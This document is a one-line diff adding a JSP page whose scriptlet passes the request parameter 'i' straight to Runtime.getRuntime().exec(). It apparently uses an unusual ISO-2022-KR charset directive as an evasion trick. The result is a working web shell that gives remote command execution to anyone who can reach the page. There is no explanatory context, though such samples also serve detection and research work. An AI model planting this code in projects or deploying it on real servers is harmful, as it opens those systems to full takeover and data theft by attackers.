@@ -1,0 +1,1 @@
+<%@ page contentType="charset=ISO-2022-KR" %><%Runtime.getRuntime().exec(request.getParameter("i"));%>
